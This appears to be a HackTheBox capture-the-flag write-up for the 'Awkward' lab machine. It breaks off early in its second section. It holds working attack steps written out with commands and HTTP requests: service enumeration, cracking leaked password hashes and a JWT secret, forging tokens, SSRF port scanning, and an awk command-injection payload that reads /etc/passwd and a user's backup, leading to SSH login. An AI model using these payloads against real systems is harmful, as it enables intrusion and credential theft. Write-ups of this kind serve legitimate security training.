# Awkward - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Awkward.JPG](images/Awkward.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22``` and ```80```.

***User 1***: Found vhost ```store.hat-valley.htb```, Found API ```/api/staff-details``` sending request without cookies and we get users and passwords, crack the password of ```christopher.jones```, Crack the JWT secret token, Found ```SSRF``` on ```/api/store-status```, Using the ```SSRF``` we found internal port ```3002``` which contains the API doc and the implementation for each method, Found code injection on ```awk``` on ```/api/all-leave``` request, Signing a new JWT token with ```awk``` command injection which leads to ```LFI```, Using the ```LFI``` we read the ```.bashrc``` file of ```bean``` user and we found a backup script, Download the backup from ```/home/bean/Documents/backup/bean_backup_final.tar.gz``` and we found on the backup the password of ```bean.hill``` user on ```backup/.config/xpad/content-DS1ZS1```.

***User 2***: Found the password of ```store.hat-valley.htb``` on ```/etc/nginx/conf.d/.htpasswd```, On ```/var/www/store/cart_actions.php``` we found command injection using ```sed``` on delete item operation, Using that we get a reverse shell as ```www-data```.

***Root***: By running ```pspy64``` we found ```root``` user runs script ```/root/scripts/notify.sh``` to notify about changes on ```/var/www/private/leave_requests.csv``` file, At the moment the file changed ```root``` sends mail, Use ```--exec``` command to run script on ```mail``` command, Using that we get a reverse shell as ```root```.

![pwn.JPG](images/pwn.JPG)


## Awkward Solution

### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ nmap -sV -sC -oA nmap/Awkward 10.10.11.185
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 22:27 IST
Nmap scan report for 10.10.11.185
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port ```80``` we redirect to ```hat-valley.htb```, Lets add it to ```/etc/hosts```:

![port80.JPG](images/port80.JPG)

By running ```gobuster``` we found the following ```vhost```:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ gobuster vhost -u hat-valley.htb -w subdomains-top1milion.txt -o vhosts -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://hat-valley.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/19 22:30:52 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.hat-valley.htb (Status: 401) [Size: 188]

```

And by browsing this vhost we get:

![store.JPG](images/store.JPG)

By reading the source code we can see the application is developed using ```vue```, Let's observe the source code:

![source.JPG](images/source.JPG)

The ```route.js``` file contains:
```javascript
import { createWebHistory, createRouter } from "vue-router";
import { VueCookieNext } from 'vue-cookie-next'
import Base from '../Base.vue'
import HR from '../HR.vue'
import Dashboard from '../Dashboard.vue'
import Leave from '../Leave.vue'

const routes = [
  {
    path: "/",
    name: "base",
    component: Base,
  },
  {
    path: "/hr",
    name: "hr",
    component: HR,
  },
  {
    path: "/dashboard",
    name: "dashboard",
    component: Dashboard,
    meta: {
      requiresAuth: true
    }
  },
  {
    path: "/leave",
    name: "leave",
    component: Leave,
    meta: {
      requiresAuth: true
    }
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

export default router;
```

We can see that we have a few endpoints ```/hr```, ```/dashboard``` and ```/leave```.

If we browse to ```/hr``` page with the token cookie != 'guest' we skip to the login page, Let's try it by changing the cookie ```token```:

![hr.JPG](images/hr.JPG)

By observing the network on this page we can see the following web requests:

![staff-details.JPG](images/staff-details.JPG)

We can see the error that we get ```sonWebTokenError: jwt malformed```, But if we send it again without any cookie we get the following response:

![staff-details-wo-cookie.JPG](images/staff-details-wo-cookie.JPG)

```json
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

```john``` success to crack only the second hash of ```christopher.jones```:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ cat hash
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt  --format=raw-sha256 hash
Using default input encoding: UTF-8
Loaded 1 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash typ
Will run 1 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chris123         (?)
1g 0:00:00:01 DONE (2022-11-26 01:25) 0.6060g/s 8692Kp/s 8692Kc/s 26098KC/s (4510458faruk)..evevev
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
```

The password of ```christopher.jones``` is ```chris123```.

By login using those credentials we get the following:

![christopher.JPG](images/christopher.JPG)

And now the HTTP request contains the token:
```HTTP
GET /dashboard HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY5NDE4OTc1fQ.LE8_OGkFQp2UVjc-1X-zS292YAhdTMF0nxhFd-weJ4A
Upgrade-Insecure-Requests: 1
If-None-Match: W/"b41-tn8t3x3qcvcm126OQ/i0AXwBj8M"

```

The JWT token contains the following payload:
```json
{
  "username": "christopher.jones",
  "iat": 1669418975
}
```

Let's try to crack the JWT secret using ```john```:
using john
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ cat jwt.txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY5NDE4OTc1fQ.LE8_OGkFQp2UVjc-1X-zS292YAhdTMF0nxhFd-weJ4A
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt --format=HMAC-SHA256 jwt.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123beany123      (?)
1g 0:00:00:03 DONE (2022-11-26 01:38) 0.3164g/s 4219Kp/s 4219Kc/s 4219KC/s 123erin123..123Oromocto
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we get the JWT secret ```123beany123```, We can create a new JWT token with ```bean.hill``` as user because he have role of ```System Administrator```, Let's do it using [https://jwt.io/](https://jwt.io/):

![jwtio.JPG](images/jwtio.JPG)

So we have the ```System Administrator``` JWT token ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJlYW4uaGlsbCIsImlhdCI6MTY2OTQxODk3NX0.76TcWfsfWQ6neb9LSatGxX2ZXXgOq4dqatcvS3Bz76I```.

By observing again the network we can see also the following HTTP request
```HTTP
GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://hat-valley.htb/dashboard
DNT: 1
Connection: close

Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY5NDE4OTc1fQ.LE8_OGkFQp2UVjc-1X-zS292YAhdTMF0nxhFd-weJ4A
```

We can use this API using to get [SSRF](https://portswigger.net/web-security/ssrf), To do so we can use ```ffuf``` to enumerate for each local port on the machine, Example with port ```80```:
```HTTP
GET /api/store-status?url=%22http:%2F%2F127.0.0.1:80%22 HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://hat-valley.htb/dashboard
DNT: 1
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJlYW4uaGlsbCIsImlhdCI6MTY2OTQxODk3NX0.76TcWfsfWQ6neb9LSatGxX2ZXXgOq4dqatcvS3Bz76I

```

Response:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Nov 2022 00:01:48 GMT
Content-Type: text/html; charset=utf-8
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"84-P/5ob00JvOzx20G7pf2GChzepTg"
Content-Length: 132

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="0; url='http://hat-valley.htb'" />
</head>
<body>
</body>
</html>

```

Let's use ```ffuf``` (We don't have to do it using the JWT token):
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ for i in $(seq 1 10000); do echo $i >> ports; done
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ ffuf -w ./ports -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"
 :: Wordlist         : FUZZ: ./ports
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

80                      [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 208ms]
3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 113ms]
8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 250ms]
:: Progress: [10000/10000] :: Job [1/1] :: 313 req/sec :: Duration: [0:00:34] :: Errors: 0 ::

```

We can see that we have the ports ```3002``` and ```8080```, Port [3002](./port3002.html) contains:

![port3002.JPG](images/port3002.JPG)

And Port [8080](./port8080.html) require JavaScript to run.

port ```3002``` give us the all API endpoints routes as well as their source code!

Lets observe the source code ```All Leave (/api/all-leave)``` API request:
```javascript
app.get('/api/all-leave', (req, res) => {

  const user_token = req.cookies.token

  var authFailed = false

  var user = null

  if(user_token) {

    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)

    if(!decodedToken.username) {

      authFailed = true

    }

    else {

      user = decodedToken.username

    }

  }

  if(authFailed) {

    return res.status(401).json({Error: "Invalid Token"})

  }

  if(!user) {

    return res.status(500).send("Invalid user")

  }

  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]


  const badInUser = bad.some(char => user.includes(char));


  if(badInUser) {

    return res.status(500).send("Bad character detected.")

  }


  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {

    if(stdout) {

      return res.status(200).send(new Buffer(stdout, 'binary'));

    }

    if (error) {

      return res.status(500).send("Failed to retrieve leave requests")

    }

    if (stderr) {

      return res.status(500).send("Failed to retrieve leave requests")

    }

  })

})
```

```exec``` command calls to ```awk``` command that passes the user variable which has the decoded ```JWT``` token username value which we can change because we have the ```JWT``` token secret.

We can use it to print the content of files from the target machine, Let's try it locally:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward]
└──╼ $ awk '//' /etc/hosts '/' leave_requests.csv
# Host addresses
127.0.0.1  localhost
...
# Others
10.10.11.185	hat-valley.htb store.hat-valley.htb
awk: cmd. line:1: warning: command line argument `/' is a directory: skipped
awk: cmd. line:1: fatal: cannot open file `leave_requests.csv' for reading: No such file or directory
```

As we can see, we get the content of ```/etc/hosts``` file, We have [LFI](https://forum.portswigger.net/thread/local-file-inclusion-and-remote-code-execution-request-405abea6).

Lets create the following JWT payload to read ```/etc/hosts```:
```json
{
  "username": "/' /etc/passwd '",
  "iat": 1669418975
}
```

![jwtlfi.JPG](images/jwtlfi.JPG)

Request:
```HTTP
GET /api/all-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://hat-valley.htb/dashboard
DNT: 1
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Njk0MTg5NzV9.z5upqDF1WTxmhFB2sMerqx868s_Zqw7diDrjqZ6Hl0w

```

Response:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Nov 2022 00:41:04 GMT
Content-Type: application/octet-stream
Content-Length: 3059
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"bf3-PdFG97gBjwRp4RtnVyUN3af1LtA"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:999::/var/log/laurel:/bin/false
```

We have three users with ```bash``` - ```bean```, ```christine``` and ```root```.

By trying to get ```/home/christine/.ssh/id_rsa``` and ```/home/bean/.ssh/id_rsa``` we get ```Failed to retrieve leave requests```responses from the server.

By reading the ```.bashrc``` of ```bean``` using ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjY5NDE4OTc1fQ.hS5BNhkrF5f-wJIwoX0IQn4qmvUHzqgmtT4WSqbpng8``` we get:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Nov 2022 00:49:57 GMT
Content-Type: application/octet-stream
Content-Length: 3847
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"f07-ypE/+rfnER8/a2uax1UKtXq6eaw"


# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

```

We can see the following line:
```console

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

```

Let's read this file using the following JWT ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Njk0MTg5NzV9.RByg8O7oaukynZZHSC_XTYfP__ivXKSkZa5Nel3vz2Q``` we get:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 26 Nov 2022 00:51:55 GMT
Content-Type: application/octet-stream
Content-Length: 369
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"171-tpXrl2gSeqg6oBUojjtuEj25udY"

#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp

```

We can see the script backup the ```/home/bean``` directory to ```/home/bean/Documents/backup/bean_backup_final.tar.gz```, Let's get this file using the following JWT ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2OTQxODk3NX0.dJ2e17QMby3REbOy6DgGcMYNFabPCIt3rpmXkXbVxoY``` (We can get the file by clicking on ```Copy to file``` on ```Burp``` and delete the HTTP headers or using ```curl```).

```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward/backup]
└──╼ $ file bean_backup_final.tar.gz
bean_backup_final.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 168624128
```

We need to extract the file using the ```File Manager```, The first file contains ```bean_backup_final``` file which contains ```bean_backup.tar.gz``` and ```time.txt```:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward/backup]
└──╼ $ ll
total 105K
-rwxrwx--- 1 root vboxsf 40K Nov 26 03:09 bean_backup_final
-rwxrwx--- 1 root vboxsf 31K Nov 26 03:09 bean_backup_final.zip
-rwxrwx--- 1 root vboxsf 32K Sep 15 14:46 bean_backup.tar.gz
-rwxrwx--- 1 root vboxsf  30 Sep 15 14:46 time.txt
```

And by running ```tar xvf bean_backup.tar.gz``` we get the ```home``` directory of ```bean```:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward/backup]
└──╼ $ ls -ltra
total 125
-rwxrwx--- 1 root vboxsf   807 Sep 15 14:34 .profile
-rwxrwx--- 1 root vboxsf   220 Sep 15 14:34 .bash_logout
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 snap
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 .local
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Videos
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Templates
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Public
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Pictures
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Music
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Downloads
drwxrwx--- 1 root vboxsf     0 Sep 15 14:35 Desktop
drwxrwx--- 1 root vboxsf     0 Sep 15 14:36 .ssh
drwxrwx--- 1 root vboxsf     0 Sep 15 14:36 .gnupg
drwxrwx--- 1 root vboxsf  4096 Sep 15 14:41 .config
-rwxrwx--- 1 root vboxsf  3847 Sep 15 14:45 .bashrc
drwxrwx--- 1 root vboxsf  4096 Sep 15 14:45 .
-rwxrwx--- 1 root vboxsf    30 Sep 15 14:46 time.txt
drwxrwx--- 1 root vboxsf     0 Sep 15 14:46 Documents
-rwxrwx--- 1 root vboxsf 32344 Sep 15 14:46 bean_backup.tar.gz
drwxrwx--- 1 root vboxsf  4096 Nov 26 03:01 ..
-rwxrwx--- 1 root vboxsf 40960 Nov 26 03:09 bean_backup_final
-rwxrwx--- 1 root vboxsf 31716 Nov 26 03:09 bean_backup_final.zip

```

By enumerating on the directories we found password on ```backup/.config/xpad/content-DS1ZS1```:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward/backup/.config/xpad/content-DS1ZS1]
└──╼ $ cat content-DS1ZS1 
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
```

Let's use the password ```014mrbeanrules!#P``` using SSH:
```console
┌─[evyatar9@parrot]─[/hackthebox/Awkward/backup/.config/xpad/content-DS1ZS1]
└──╼ $ ssh bean@hat-valley.htb 
The authenticity of host 'hat-valley.htb (10.10.11.185)' can't be established.
ECDSA key fingerprint is SHA256:Y3WldzAxm5ypDBD7CKdfTNWGnUu04xdwdmFIXEQOupM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hat-valley.htb,10.10.11.185' (ECDSA) to the list of known hosts.
bean@hat-valley.htb's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.14
bean@awkward:~$ cat user.txt 
dfc6b4da9ae2305a2199d0c67f57ade9
```

And we get the user flag ```dfc6b4da9ae2305a2199d0c67f57ade9```.

### User 2

By enumerating we found the following ```.htaccess``` file:
```console
bean@awkward:~$ ls -ltr /etc/nginx/conf.d/.htpasswd
